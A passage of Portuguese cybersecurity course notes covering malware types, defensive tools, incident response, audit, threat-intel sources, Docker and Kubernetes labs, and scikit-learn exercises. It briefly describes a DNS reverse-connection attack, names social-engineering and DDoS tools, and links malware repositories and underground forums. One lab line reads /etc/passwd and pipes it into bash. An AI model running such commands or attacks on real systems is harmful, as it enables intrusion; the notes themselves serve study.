   - Cenário: Com acesso à maquina alvo, rode o script em ruby e faça a "consulta" DNS no servidor atacante, dessa forma fechando a conexão reversa com o atacante.
   - Mitigar: Apontar o DNS para o Cisco Umbrella, DNSsec, Inserir mecanismos de detecção encima do comportamento do ataque.

4. SE Toolkit
Social engineering Tool Kit
Framework de utilização de engenharia social

5. DDoS Amplifier
Ferramenta para ataques DDos (Distributed Deny of Service)

Definições:

`Malware` é um software malicioso e existem diversos tipos de MALWARE: Stuxnet, keyloger, virus, warms...
	Warm se espalha pela rede
	Virus infecta arquivos
 	Trojan se esconde em software legítimo
  	Ransomware criptografa arquivos
   	Spyware espia a vitima
    	Adware é usando como propagandas
     	Keylogger captura o teclado e armazena
      	Rootkit se esconde no SO
       	Backdoor permite o atacante se conectar remotamente
	Dropper faz download de arquivos
 	Bot é um robô (maquina que foi infectada)
  	Packer maware que gera o trojan

Ferramentas:

`Sniffing` é o ato de escutar a rede e saber o que está trafegando na rede, e tudo que navega de forma insegura.
`Cain e Abel` é um software de sniffing e serve para capturar credenciais da rede.

`Rainbow table` é uma solução que consta as hashes e senhas para facilitar a quebra de senhas
[Site Rainbow table](https://ophcrack.sourceforge.io/tables.php)

Aborda SQLinjection e XSS para se proteger dessas vulnerabilidades é precisa fazer uma verificação de entrada de usuário e fazer a tratativas.

`Bastion Host:` Equipamento que fica exposto na internet, Firewall, servidor...
`Multihomed Firewall:` Dois firewall com redes no centro para evitar a invasão completa da rede, e um firewal pode impedir que passe para outra rede
`Zona Desmilitarizada` (DMZ) rede menos segura separada para que se houver invasão, as demais redes não serão comprometidos.
`Zero Trust` nenhuma confiança na rede e pessoas. Oposto de Default Trust. Nesse caso exige que seja feita outras maneiras de identificar uma pessoa, acesso ou servidor, podendo ser um MFA, e precisa atender alguns critérios por meio de agentes instalados nas maquinas fazendo as devidas validações centralizadas em um serviço geralmente em cloud.

Software de gestão de firewalls `AlgoSec`.

`OSSEC` Software que é um Host IDS gratuita e com funcionalidades pagas.
`Suricata e Snort` soluções de Network IPS gratúitas
`IDPS` Solução avançada de Intrusao e Detectção de sistemas: Detecta e atua na parte de aplicação, compara assinaturas e gera alertas com uma lista já conhecida, engine de anomalias: análise de comportamentos estranhos.

`HonneyPot:` [TPotce](https://github.com/telekom-security/tpotce) ferramenta de HonneyPot para implementar e saber como está a atividade de ataques atuais.

`Waf3Py:` Ferramenta de WAF open source para implementação da solução de Web Application Firewall [Waf2py](https://github.com/ITSec-Chile/Waf2Py)

`ModSecurity:` WAF onpremise que é a base de outros firewalls conhecidos [ModSecurity](https://www.modsecurity.org/) 

`Trivy:` Trivy é uma ferramenta de scan para encontrar problemas na AWS de forma autenticada, em busca de não conformidade [Trivy](https://trivy.dev)

`Horusec:` Ferramenta que escaneia vulnerabilidades em códigos fonte. [HoruSec](https://horusec.io)

`OwaspZap:` Ferramenta específica de scan web em busca de vulnerabilidades 

`ScoutSuite:` é uma ferramenta de scan para encontrar problemas na AZURE de forma autenticada, em busca de não conformidade.

`DefectDojo:` Ferramenta de gestão de vulnerabilidades para a esteira de vulnerabilidades

`IDPS:` Análise em tempo real (ele processa todos os pacotes e deixa mais lento) Análise baseada em intervalos (não gera muita latência na rede). Onde colocar? Backbone, Borda, locais mais críticos.

`Wireless IPS:` Equipamento que faz uma análise de comportamento realizando análise de ataques, clone de SSID...

`WAF:` Web Application Firewall - ModSecurity (Free).

`FIM:` File Integrity Monitor - Monitora os arquivos e verifica as hashes para ver se foi modificado.

`API:`  SOAP usa HTTP e XML - REST usa HTTP e JSON [OWASP-API](https://owasp.org/www-project-api-security/) SALT Solução em segurança de API

`Endpoint Security` = Antivirus avançado, com muitas outras funcionalidades, firewall, malware, patch...

`EDR` é um endpoint com capacidade de respostas à incidentes

`GuardiCore:` Software de microssegmentação (saber oq ue cada processo e usuario pode e faz no sistema)

`Hardening:` Processo sistemático de elevar segurança de um ativo - [Site CIS](https://www.cisecurity.org/cis-benchmarks) oferece um documentdo de hardening para seguir as boas praticas

`Monitoramento de rede` É o processo de inspacionar o que passa pela rede e filtrar baseado em comportamentos, pode-se utilizar TAP,SPAN e agentes pare essa finalidade

`TAPS:` Equipamento que replica logs e direcionada para outras soluções como DLP, IDS, IPS... (Gigamon é um exemplo de soluçao TAP)

`SPAN:` Outro modo de monitorar redes alternativo ao TAP que é por meio de uma porta do Switch. 

`Inspeção de SSL:` É basicamente a ferramenta de inspeção ficar no meio da conexão (MITM). E existem dois tipos, Sainte e Entrante. Entrante, todo o tráfego que é feito no servior web da empresa que detêm a ferramenta, faz a decodificação do pacote e inspeciona-o para saber a sua procedência. O saíte é alguém de dentro da empresa acessando o site do google, e para isso (por nao ter o certificado do google) a empresa precisa montar um inspetor de SSL local, gerar um certificado e espalhar pela rede (via GPO), para esse certificado ser usando ao invéz do google, podendo assim inspecionar todo o tráfego dos sites.

`Flow de rede:` Monitorar a rede baseada em volume de dados que estão sendo gerados. E não só isso, ele te ta detalhes de onde e para onde estão indo essas conexões. Tipos de NetFlow - Netflow v9: Implementada pela CISCO, mandando dados dos pacotes de rede. IPFIX - Definida pela IETF, mandando uma amostra previamente.

`Tipos de Assinaturas:` Atômica e Composta. Atômica é analisado por um pacote apenas (Ping da Morte). Composta é baseada em vários pacotes (PostScan).

`Maturidade de SOC:` Conteúdos `SOC-CAPABILITY-MODEL` [Site](https://www.soc-cmm.com/) NIST CYBER SECURITY FRAMEWORK [Site](https://www.nist.gov/cyberframework/csf-11-archive)

`DefectDojo` Ferramenta de gerenciamento de vulnerabilidade

`IDM` Software para gerenciamento de acessos em AD, ERP, RH... `PAM` São so acessos de maiores privilégios... SenhaSegura é um software de cofre de senhas.

`Resposta a Incidentes:` 1-Preparação; 2-Registro de Incidentes; 3-Triagem; 4-Notificação; 5-Contenção; 6-Coleta de evidências; 7-Erradicação; 8-Recuperação; 9-Atividades Pós-incidente. 

`IoC` Indicadores de Comprometimentos pode ser IPs, Urls, hashes [Consulta de IOCs](https://exchange.xforce.ibmcloud.com/)

`MISP` é uma plataforma de consulta de IoCs

`Sumilador de Ameaças:` Softwares que simulam vazamentos de dados por exemplo e mostra como ele conseguiu, em caso positivo. Exemplo de Software Simulador [SafeBreach](https://www.safebreach.com/)

`Information Warfare` É uma empresa atacar outra para seu proprio objetivo.

`Demisto` Ferramenta de orquestração para auxiliar, centralizar e automatizar as respostas a incidentes.

`TheHive` Ferramenta de resposta a incidentes que pode ser integrada ao Wazuh

`StrongBee` Tem uma grande quantidade de ferramentas que servem para resposta a incidentes, como o `Cortex`

## TRI - Tratamento e Resposta a Incidentes

Material da Disciplina [Pós TRI](https://ygoralberto.github.io/FILES/P%C3%93S-TRI.pdf)

Para adequação e tratamento de resposta a incidentes, pode-se olhar o modelo do NIST para tal.

`Fase1:` Preparação = A fase de preparação é justamente a fase pré-incidente, onde a organização faz um levantamento interno para investir em solução de observabilidade, detecção e resposta a incidentes, seja investimento em pessoas e/ou tecnologia.
`Fase2:` Detecção e Análise = Qunado acontece um alerta de algum sistema de observabilidade o time faz a análise daquele alerta e filtra se é um incidente ou não.
`Fase3:` Contenção, Erradicação e Recuperação = Após a confirmação do incidente e filtrar se Incidente ou incidente, realizar as tratativas correlatas fazendo a contenção daquele incidente e depois a erradicação e recuperação do incidente.
`Fase4:` Atividades Pós-Incidentes =  A Atividade pós-incidente é justamente juntar tudo o que aconteceu e tomar medidas para que um incidente como aquele não aconteça mais.

Todas essas fases acima, requer tempo, dinheiro, pessoas e vai variar de acordo com a capacidade tecnológica, financeira e objetivo de cada uma. Com base nessas métricas e levantamentos se inicia a definição de cada fase com os Playbooks e Runbooks, esses documentos precisam todos serem revisados. A definição vai desde onde colocar um backup até decidir em quanto tempo a resposta a incidentes vai durar. E essas definições variam de acordo com cada empresa, então não existe uma forma fixa de como deve ser um tratamento de resposta a incidentes, mas modelos que devem ser adapatados, como por exemplo o do NIST.

- Leis e regulamentaçãos: 

`PCI-DSS` Regulamenta com foco em tratamento de dados e informações financeiras
`HIPPA` Regulamenta com foco em saúde
`GDPR` Regulamenta a União Europeia (LGPD foi baseada na GDPR)

- PASSOS de Resposta a Incidentes

Recomendações de passos para a resposta a incidentes
	
	Com o escopo definido, remova ou isole o host da rede
	Bloqueie os endereços conhecidos de C2 do atacante
	Bloqueie provedores dinâmicos de DNS
	Desabilite Usuários e troque as senhas
	Recuse tráfego web não categorizado
	Aplique patches e hardening aos sistemas
	Reconecte e monitore
	Se encontrar mais atividade maliciosa, reinicie a estratégia
	Reconstrua ou formate hosts comprometidos

- Ferramentas OpenSource IOCs

Ferramentas de indicadores de comprometimentos

	FireEye Redline
	Kroll's Kape
	Yara
	SANS SIFT
	RegRipper

- Ferramenta de CTI

      XCITIUM [Site](https://www.xcitium.com/)

- IDs de LOGS insteressantes para observar no Windows

Logs de auditoria que é importante observar

	Account Lockouts                    4740    Information   Security
	Account Login with Explicit Credentials  4648    Information   Security
	Account Name Changed                4781    Information   Security
	Account removed from Local Sec. Grp.     4733    Information   Security
	Credential Authentication           4776    Information   Security
	Credentials backed up               5376    Information   Security
	Credentials restored                5377    Information   Security
	Failed User Account Login           4625    Information   Security
	Logoff Event                        4634    Information   Security
	Logon with Special Privs            4672    Information   Security
	New User Account Created            4720    Information   Security
	New User Account Enabled            4722    Information   Security


## AUD - Auditoria e monitoramento de redes, perímetros e sistemas

Material da Disciplina [Pós AUD](https://ygoralberto.github.io/FILES/P%C3%93S-AUD.pdf)


- Auditoria de TI: Foca nos processos técnicos e operacionais de TI.
- Auditoria de processos de TI: Foca nos aspectos estratégicos e gerenciais da TI.

	Auditoria de conformidade: verifica processos de TI se estã em conformidade - existe backup
	Auditoria de eficácia: avalia se os processso de TI estão atingindo os objetivos e metas definidos pela organização - tempo de backup
	Auditoria de eficiência: analisa se os processos de TI estçao utilizando os recusos de forma otimizada sem desperdício - backup está no tempo ideal
	Auditoria de segurança: Examina os processos de forma a garantir a melhor proteção contra ameaças - backup está seguro
	Auditoria de qualidade: Mede se os produtos estão sendo entregues com o nuvel de qualidade esperado - backup está fidedigno

Conformidades:

	ISO/IEC 27000
	NBR ISO 19011
	ISO 27701

Camada de coleta de dados

 	Infraestrutura
	Sistema Operacional
	Aplicação
	Banco de Dados
	Acesso à Rede
	Usuário/Dispositivo
	Segurança

Ferramentas para auxiliar na auditoria/forense

	Autopsy
	FTK
	EnCase
	Vilatility
 
EVIDÊNCIAS (como elas devem ser)

	Sufuciente
	 	COM TODOS OS ITENS QUE PRECISAM SER COLETADOS
		TODOS OS ELEMENTOS DE ENTRADA E SAÍDA DEVEM SER CONFIGURADOS
		ELEMENTOS DERASTREABILIDADE DEVEM ESTAR DE FÁCIL ENTENDIMENTO
	Autêntica
		COMPLETUDE
		TIMESTAMPS
		INTEGRIDADE DO LOG
		DETALHES DO USUÁRIO
		DADOS DE ENTRADA/SAÍDA 
		PERSISTÊNCIA DOS LOGS
	 Convincente
	 	CONTEÚDO DAS INFORMAÇÕES DEVEM REFLETIRO PROCESSO QUE O ARTEFATO ATENDE
		DEVE CUMPRIR O CID
		DEVE POR SE SÓ PASSAR A MENSAGEM
		DEVE SER CARREGADO DE METADADOS
	 Confiável
	 	TIMESTAMPS
		PERSISTÊNCIA DOS LOGS
		LOCAL DE GRAVAÇÃO EXTERNA
		SEGURANÇA DO LOG
		AUTOMATIZADO
		COLETADO POR ELEMENTOS TERCEIROS
		MFA
		MONITORAMENTO DE LOGS
	 Atualizada
	 	COLETADA CONTINUAMENTE

Considerações para a coletas, Consolidação e Análise de Observação

	COLETA
		FERRAMENTAS DE COLETA DE DADOS
		LOGS DE EQUIPAMENTOS
		LOGS DE SERVIÇOS
		TAGS DE HEALTHCHECK
		ZABBIX
		NAGIOS
		CLOUDWATCH (AWS)
		AZURE MONITOR (AZURE)
		LOGS LOCAIS
		SNMP
		PROMETHEUS
		DATADOG
		SPLUNK
		SOLARWINDS NETWORK
		PERFORMANCE MONITOR (NPM)
		ELK STACK (ELASTICSEARCH,
		LOGSTASH, KIBANA)
	 
	CONSOLIDAÇÃO
		STACK DE MONITORAMENTO
		BANCO DE DADOS ANALÍTICO
		INTEGRADORES PARA COLETA DE DADOS 
	 	MONITORAMENTO
		APACHE HADOOP
		APACHE KAFKA
		TALEND
		INFORMATICA POWERCENTER
		MICROSOFT SQL SERVER
		INTEGRATION SERVICES (SSIS)
		MYSQL
		POSTGRESQL
		MICROSOFT SQL SERVER
		ORACLE DATABASE
		MONGODB
		CASSANDRA
		HBASE
	
	ANÁLISE E OBSERVAÇÃO
		ALARMES
		AUTOMATIZADOS
		DASHBOARDS DE ACOMPANHAMENTO
		INDICADORES PARA OBSERVABILIDADE
		DATADOG
		NEW RELIC
		SPLUNK
		ELASTIC STACK (ELK STACK) 
	 	PROMETHEUS
		DYNATRACE
		JAEGER
		HONEYCOMB
		LIGHTSTEP
		INSTANA
		GRAFANA


## IAC Disciplina


Ferramentas que concentram noticias e insumos para analisar, podendo ser utilizada para Ns fins por exemplo psEXEC

Criar conta no InoReader e adicionar os seguintes websites em "ADD FEED":

	Unit 42
	Zero Day Initiative
	SOCRadar
	Red Canary
	SpiderLabs Blog from Trustwave
	Krebs on Security
	Rapid7 Blog
	SentinelOne
	Qualys Blog
	Microsoft Security
	Trend Micro Research, News, Perspectives
	Malwarebytes Labs
	McAfee
	Ciso Advisor
	Minuto da Segurança da Informação
	Naked Security
	The Hacker News — Hacking, Cyber and Internet Security
	Hacker Noon — Medium
	Dark Reading: Vulnerabilities / Threats
	0 Day News ≈ Packet Storm
	CERT-FR

Em FEEDS "news feed" pesquisar por termos para monitorar: (as apariçoes irão aparecer de acordo com os sites que você segue)
 
 	"Medusa" AND Ransomware
 	"threat intelligence" AND report

Maquina virtual para sendbox [AnyRun](https://any.run/)

Acessar via TOR:

	ransomeware.live (CONTEM INFORMAÇÕES DOS GRUPOS DE HACKER, IOCS, DLS)
	www.ransom-db.com
	darkfeed.io
	ransomlook.io

Ferramenta `Vortion` usada para captura de evidências

- Coleta de informações

Informações sobre atores de ameaças, dominios, urls, ips, OSINT

[Abuse.ch](https://abuse.ch/)

[DomainsTools-PAID](https://www.domaintools.com)

[securitytrails.com-FREE](https://securitytrails.com/)

[urlscan.io-FREE](https://urlscan.io/)

[urlhaus.abuse.ch-FREE](https://urlhaus.abuse.ch)

[OSINT-BRAZUCA](https://github.com/osintbrazuca/osint-brazuca)

[OWESOME OSINT](https://github.com/jivoi/awesome-osint)

[OSINT Combine-PAID](https://www.osintcombine.com/platform)

[Fontes Codigos](https://grep.app)

[Lista de Sources Threat Intel](https://start.me/p/Pwpq8j/threat-intel)

[Lista de OSINT](https://start.me/p/b5Aow7/asint_collection)

[Lista de OSINT2](https://start.me/p/BnrMKd/01-ncso)

Fontes de malwares

[Malware BAZAR](https://bazaar.abuse.ch/)

[VX-Underground](https://vx-underground.org/)

[Viper Framework](https://github.com/viper-framework/viper)

Fontes de HoneyPots

[PWLANDIA](https://github.com/pwnlandia/mhn)
[Criar sua HoneyPot](https://github.com/MalwareTech/CitrixHoneypot)

Forums Underground

[RaidForum](https://raidforum.co/)

[EXPLOIT.IN](https://exploit.in/)

Ferramentas de CTI

[Neo4j-PAID](https://neo4j.com/)

[LogonTracer](https://github.com/JPCERTCC/LogonTracer)


## ASTE 

Arquiterura Monolitica (Centralizada, dificil escalabilidades, serviços e codigos juntos em um recurso (maquina))
Arquitetura Micro-Services (Descentralizada, escalabilidade facil, serviços separados em instâncias diferentes)

`NodeJsScan` ferramenta de análise de vulnerabilidades na aplicação que toda JavaScript 
`JuiceShop` laboratório para treinar hacking [JuiceShop](http://juice-shop.herokuapp.com/#/)

Ferramenta de CI/CD

`Jenkins` Ferramenta de CI/CD para fazer a build de aplicações podendo pegar o código diretamente do GitHub.
`Horusec` Coloca o script dentro do Jenkins para usar o Horusec e fazer a análise de vulnerabilodades do programa apresentado

Deploy
	`Canary` - Atualiza para um publico pequeno para pegar o feedback
	`Blue-green` - Atualiza de forma completa mas sem impactar a produção e posteriormente virar a chave


- Subindo containers em DOCKER (LAB EXTHACK)

Subindo containers de forma facil e rapido, um site simples.

	mkdir -p /home/debian/meu-site
	cd /home/debian/meu-site
	nano index.html
 .
 
		```html
		<!DOCTYPE html>
		<html>
		<head>
		    <meta charset="UTF-8">
		    <title>Página HTML Básica</title>
		    <link rel="stylesheet" type="text/css" href="styles.css">
		</head>
		<body>
		    <div class="container">
		        <h1>Bem-vindo ao meu site HTML!</h1>
		        <p>Esta é uma página HTML básica com CSS.</p>
		    </div>
		</body>
		</html>
		```
 .
 
	 nano styles.css
		```css
	 	/* Estilos básicos para a página */
		
		body {	
		    font-family: Arial, sans-serif;
		    margin: 0;
		    padding: 0;
		    background-color: #f4f4f4;
		    color: #333;
		}
			
		h1 {	
		    color: #4CAF50;
		    text-align: center;
		    margin-top: 50px;
		}
			
		p {	
		    text-align: center;
		}
			
		.container {	
		    max-width: 800px;
		    margin: 0 auto;
		    padding: 20px;
		    background-color: #fff;
		    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
		    border-radius: 10px;
		    margin-top: 50px;
		}
		```
 .
 
	nano Dockerfile
		```
		# Usar a imagem base do Nginx
		FROM nginx:latest
		# Copiar os arquivos da aplicação para o diretório padrão do Nginx
		COPY . /usr/share/nginx/html/
		# Expor a porta 80
		EXPOSE 80
		# Comando a ser executado quando o container iniciar
		CMD ["nginx", "-g", "daemon off;"]
		```
	docker build -t meu_site .
	docker image ls
	docker run -p 8084:80 meu_site
	docker run -d -p 8084:80 --name "Meu_Container_new" meu_site
	docker ps -a
	http://localhost:8084
	docker inspect <container_id> | less
	Docker ps --all
 	docker ps -a
	oker rm id-image
	docker rmi meu_site
	docker exec -it Meu_Container_new cat /etc/passwd | bash

 MINIKUBE KUBERNETS

	minikube start
	mkdir -p /home/debian/kubernetes && mkdir -p /home/debian/kubernetes/meu-site
	cd /home/debian/kubernetes/meu-site
	kubectl create namespace meu-lab
.

	nano nginx-deployment.yaml

.

		apiVersion: apps/v1
		kind: Deployment
		metadata:
		  name: nginx-deployment
		  namespace: meu-lab
		spec:
		  replicas: 10
		  selector:
		    matchLabels:
		      app: nginx
		  template:
		    metadata:
		      labels:
		        app: nginx
		    spec:
		      containers:
		      - name: nginx
		        image: nginx:latest
		        imagePullPolicy: IfNotPresent
		        ports:
		        - containerPort: 80
		        volumeMounts:
		        - name: html-volume
		          mountPath: /usr/share/nginx/html
		      volumes:
		      - name: html-volume
		        configMap:
		          name:
.

	nano html-configmap.yaml

.

		apiVersion: v1
		kind: ConfigMap
		metadata:
		    name: html-config
		    namespace: meu-lab
		data:
		    index.html: |
		        <!DOCTYPE html>
		        <html>
		        <head>
		                <meta charset="UTF-8">
		                <title>Página HTML Básica</title>
		                <link rel="stylesheet" type="text/css" href="styles.css">
		        </head>
		        <body>
		                <div class="container">
		                <h1>Bem-vindo ao meu site HTML no Kubernetes!</h1>
		                <p>Esta é uma página HTML básica com CSS. Agora no Kubernetes</p>
		        </div>
		        </body>
		        </html>
		    styles.css: |
		        body {
		                font-family: Arial, sans-serif;
		                margin: 0;
		                padding: 0;
		                background-color: #f4f4f4;
		                color: #333;
		        }
		
		        h1 {
		                color: #4CAF50;
		                text-align: center;
		                margin-top: 50px;
		        }
		
		        p {
		                text-align: center;
		        }
		
		        .container {
		                max-width: 800px;
		                margin: 0 auto;
		                padding: 20px;
		                background-color: #fff;
		                box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
		                border-radius: 10px;
		                margin-top: 50px;
		        }
.
  
  		kubectl apply -f html-configmap.yaml
		kubectl apply -f nginx-deployment.yaml

.

		nano nginx-service.yaml

.

			apiVersion: v1
		kind: Service
		metadata:
		    name: nginx-service
		    namespace: meu-lab
		spec:
		    selector:
		        app: nginx
		    ports:
		    - protocol: TCP
		      port: 8090
		      targetPort: 80
		    type: NodePort

.

	kubectl apply -f nginx-service.yaml
	minikube image load nginx:latest
	minikube image ls
	minikube service nginx-service -n meu-lab
	minikube logs | less
	kubectl get po -A
	kubectl get nodes
	kubectl scale deployment nginx-deployment --replicas=15 -n meu-lab REPLICA A APLICAÇÃO em mais PODS
	kubectl get pods -n meu-lab

Colab Research Google
https://colab.research.google.com

Laboratório para testar códigos em python e testar IA ou códigos de laboratório.

## Atividade 1: Aprendizado de Dicionário Esparso com MiniBatchDictionaryLearning em Conjunto de Dados de Faces

### Objetivo

O objetivo desta atividade é aplicar a técnica de MiniBatchDictionaryLearning para aprender representações esparsas de um conjunto de dados de faces (Olivetti Faces). Nós iremos:

1. Instalar bibliotecas necessárias e carregar o conjunto de dados.
2. Utilizar o algoritmo MiniBatchDictionaryLearning para decompor as imagens em componentes básicos.
3. Visualizar e interpretar os componentes aprendidos, compreendendo como padrões e características recorrentes são extraídos das imagens.

### Passos para Preparação no Google Colab

#### 1. Instalar Bibliotecas Necessárias
No Google Colab, você pode instalar diretamente as bibliotecas que precisará.

- Instale as bibliotecas:

```python
!pip install scikit-learn numpy matplotlib
```

#### 2. Baixar e Carregar o Olivetti Faces Dataset
No Colab, você pode usar diretamente a função `fetch_olivetti_faces` para baixar e carregar o dataset.

```python
from sklearn.datasets import fetch_olivetti_faces

# Baixar e carregar o dataset
faces = fetch_olivetti_faces()
images, labels = faces.images, faces.target
```

#### 3. Exibir Algumas Imagens do Dataset
Para visualizar algumas imagens do dataset, use o código abaixo:

```python
import matplotlib.pyplot as plt

# Exibir algumas imagens
fig, axes = plt.subplots(1, 10, figsize=(15, 5))
for i in range(10):
    axes[i].imshow(images[i], cmap='gray')
    axes[i].axis('off')
plt.show()
```

#### 4. Aplicar MiniBatchDictionaryLearning
Depois de carregar as imagens, você pode aplicar o algoritmo MiniBatchDictionaryLearning.

```python
from sklearn.decomposition import MiniBatchDictionaryLearning
import numpy as np

# Configurar o algoritmo
n_components = 100  # Número de componentes (átomos)
batch_size = 3  # Tamanho do batch

# Remodelar as imagens para vetor
data = images.reshape((images.shape[0], -1))

# Aplicar MiniBatchDictionaryLearning
dico = MiniBatchDictionaryLearning(n_components=n_components, alpha=1, batch_size=batch_size, max_iter=500, random_state=0)
V = dico.fit(data).components_

# Visualizar os componentes
fig, axes = plt.subplots(10, 10, figsize=(15, 15))
for i, comp in enumerate(V[:100]):
    ax = axes[i // 10, i % 10]
    ax.imshow(comp.reshape(64, 64), cmap='gray')
    ax.axis('off')
plt.show()
```

### Script Completo no Google Colab
Aqui está o script completo atualizado para execução no Google Colab:

```python
import matplotlib.pyplot as plt
from sklearn.decomposition import MiniBatchDictionaryLearning
import numpy as np
from sklearn.datasets import fetch_olivetti_faces

# Baixar e carregar o dataset
faces = fetch_olivetti_faces()
images, labels = faces.images, faces.target

# Exibir algumas imagens
fig, axes = plt.subplots(1, 10, figsize=(15, 5))
for i in range(10):
    axes[i].imshow(images[i], cmap='gray')
    axes[i].axis('off')
plt.show()

# Configurar o algoritmo
n_components = 100  # Número de componentes (átomos)
batch_size = 3  # Tamanho do batch

# Remodelar as imagens para vetor
data = images.reshape((images.shape[0], -1))

# Aplicar MiniBatchDictionaryLearning
dico = MiniBatchDictionaryLearning(n_components=n_components, alpha=1, batch_size=batch_size, max_iter=500, random_state=0)
V = dico.fit(data).components_

# Visualizar os componentes
fig, axes = plt.subplots(10, 10, figsize=(15, 15))
for i, comp in enumerate(V[:100]):
    ax = axes[i // 10, i % 10]
    ax.imshow(comp.reshape(64, 64), cmap='gray')
    ax.axis('off')
plt.show()
```

### Explicação para os Alunos
- O dataset Olivetti Faces contém 400 imagens de rostos em tons de cinza.
- O objetivo é aplicar a técnica de MiniBatchDictionaryLearning para decompor as imagens em componentes básicos, chamados átomos.
- A atividade envolve carregar e visualizar as imagens, configurar e aplicar o algoritmo, e finalmente visualizar os componentes aprendidos.
- Os alunos poderão ver como o algoritmo detecta padrões recorrentes nas imagens, o que é útil para compressão de imagens e reconhecimento facial.

## Atividade 2: Análise de Agrupamento (Clustering) de Tipos de Vinho com o scikit-learn

### Objetivo
O objetivo desta atividade é aprendermos sobre como aplicar técnicas de clustering para agrupar diferentes tipos de vinho com base em suas características químicas. Nós iremos:
- Carregar e explorar o conjunto de dados Wine.
- Aplicar o algoritmo K-Means para agrupar os dados.
- Visualizar os clusters resultantes e interpretar os resultados.

### Passos para a Atividade

#### 1. Carregar e Explorar o Conjunto de Dados
```python
from sklearn.datasets import load_wine
import pandas as pd

# Carregar o conjunto de dados Wine
wine = load_wine()
data = pd.DataFrame(data=wine.data, columns=wine.feature_names)
data['target'] = wine.target

# Exibir as primeiras linhas do conjunto de dados
print(data.head())
```

#### 2. Normalizar os Dados
```python
from sklearn.preprocessing import StandardScaler

# Normalizar os dados para ter média 0 e desvio padrão 1
scaler = StandardScaler()
scaled_data = scaler.fit_transform(wine.data)
```

#### 3. Aplicar o Algoritmo K-Means
```python
from sklearn.cluster import KMeans

# Definir o número de clusters
n_clusters = 3

# Aplicar K-Means
kmeans = KMeans(n_clusters=n_clusters, random_state=42)
kmeans.fit(scaled_data)

# Adicionar os rótulos dos clusters ao dataframe
data['cluster'] = kmeans.labels_
```

#### 4. Visualizar os Clusters
Para visualização, vamos utilizar um gráfico 2D com redução de dimensionalidade via PCA.

```python
from sklearn.decomposition import PCA
import matplotlib.pyplot as plt

# Reduzir a dimensionalidade para 2 componentes principais
pca = PCA(n_components=2)
principal_components = pca.fit_transform(scaled_data)

# Adicionar os componentes principais ao dataframe
data['PC1'] = principal_components[:, 0]
data['PC2'] = principal_components[:, 1]

# Plotar os clusters
plt.figure(figsize=(10, 6))
for cluster in range(n_clusters):
    cluster_data = data[data['cluster'] == cluster]
    plt.scatter(cluster_data['PC1'], cluster_data['PC2'], label=f'Cluster {cluster}')
plt.xlabel('Principal Component 1')
plt.ylabel('Principal Component 2')
plt.title('Clustering de Vinho com K-Means')
plt.legend()
plt.show()
```

### Script Completo
Aqui está o script completo para a atividade:

```python
from sklearn.datasets import load_wine
import pandas as pd
from sklearn.preprocessing import StandardScaler
from sklearn.cluster import KMeans
from sklearn.decomposition import PCA
import matplotlib.pyplot as plt

# Carregar o conjunto de dados Wine
wine = load_wine()
data = pd.DataFrame(data=wine.data, columns=wine.feature_names)
data['target'] = wine.target

# Exibir as primeiras linhas do conjunto de dados
print(data.head())

# Normalizar os dados para ter média 0 e desvio padrão 1
scaler = StandardScaler()
scaled_data = scaler.fit_transform(wine.data)

# Definir o número de clusters
n_clusters = 3

# Aplicar K-Means
kmeans = KMeans(n_clusters=n_clusters, random_state=42)
kmeans.fit(scaled_data)

# Adicionar os rótulos dos clusters ao dataframe
data['cluster'] = kmeans.labels_

# Reduzir a dimensionalidade para 2 componentes principais
pca = PCA(n_components=2)
principal_components = pca.fit_transform(scaled_data)

# Adicionar os componentes principais ao dataframe
data['PC1'] = principal_components[:, 0]
data['PC2'] = principal_components[:, 1]

# Plotar os clusters
plt.figure(figsize=(10, 6))
for cluster in range(n_clusters):
    cluster_data = data[data['cluster'] == cluster]
    plt.scatter(cluster_data['PC1'], cluster_data['PC2'], label=f'Cluster {cluster}')
plt.xlabel('Principal Component 1')
plt.ylabel('Principal Component 2')
plt.title('Clustering de Vinho com K-Means')
plt.legend()
plt.show()
```

### Explicação para os Alunos
- O conjunto de dados Wine contém informações químicas de diferentes tipos de vinho.
- O objetivo é agrupar os vinhos em clusters com base em suas características usando o algoritmo K-Means.
- A normalização dos dados é importante para garantir que todas as características contribuam igualmente para os clusters.
- A técnica de PCA (Principal Component Analysis) é usada para reduzir a dimensionalidade dos dados e permitir a visualização em 2D.
- Eles podem observar como os vinhos são agrupados e analisar se os clusters fazem sentido em termos de suas características químicas.


## Atividade 3: Classificação de Espécies de Flores Iris com o scikit-learn

### Objetivo
O objetivo desta atividade é ensinar como criar, treinar e avaliar um modelo de classificação utilizando o conjunto de dados Iris. Os alunos irão:
1. Carregar e explorar o conjunto de dados Iris.
2. Dividir o conjunto de dados em conjuntos de treino e teste.
3. Treinar um modelo de classificação utilizando diferentes algoritmos.
4. Avaliar a precisão do modelo e interpretar os resultados.

### Passos para a Atividade

#### 1. Carregar e Explorar o Conjunto de Dados
```python
from sklearn.datasets import load_iris
import pandas as pd

# Carregar o conjunto de dados Iris
iris = load_iris()
data = pd.DataFrame(data=iris.data, columns=iris.feature_names)
data['target'] = iris.target

# Exibir as primeiras linhas do conjunto de dados
print(data.head())
```

#### 2. Dividir o Conjunto de Dados em Treino e Teste
```python
from sklearn.model_selection import train_test_split

# Dividir o conjunto de dados em treino e teste
X_train, X_test, y_train, y_test = train_test_split(iris.data, iris.target, test_size=0.3, random_state=42)
```

#### 3. Treinar um Modelo de Classificação
Vamos utilizar o algoritmo de **Árvore de Decisão** como exemplo. Você pode adicionar outros algoritmos como **K-Nearest Neighbors (KNN)** e **Support Vector Machine (SVM)** para comparação.

```python
from sklearn.tree import DecisionTreeClassifier

# Treinar o modelo de Árvore de Decisão
clf = DecisionTreeClassifier(random_state=42)
clf.fit(X_train, y_train)
```

#### 4. Avaliar o Modelo
```python
from sklearn.metrics import accuracy_score, classification_report

# Fazer previsões no conjunto de teste
y_pred = clf.predict(X_test)

# Avaliar a precisão do modelo
accuracy = accuracy_score(y_test, y_pred)
report = classification_report(y_test, y_pred, target_names=iris.target_names)

print(f'Accuracy: {accuracy}')
print('Classification Report:')
print(report)
```

### Script Completo
Aqui está o script completo para a atividade:

```python
from sklearn.datasets import load_iris
import pandas as pd
from sklearn.model_selection import train_test_split
from sklearn.tree import DecisionTreeClassifier
from sklearn.metrics import accuracy_score, classification_report

# Carregar o conjunto de dados Iris
iris = load_iris()
data = pd.DataFrame(data=iris.data, columns=iris.feature_names)
data['target'] = iris.target

# Exibir as primeiras linhas do conjunto de dados
print(data.head())

# Dividir o conjunto de dados em treino e teste
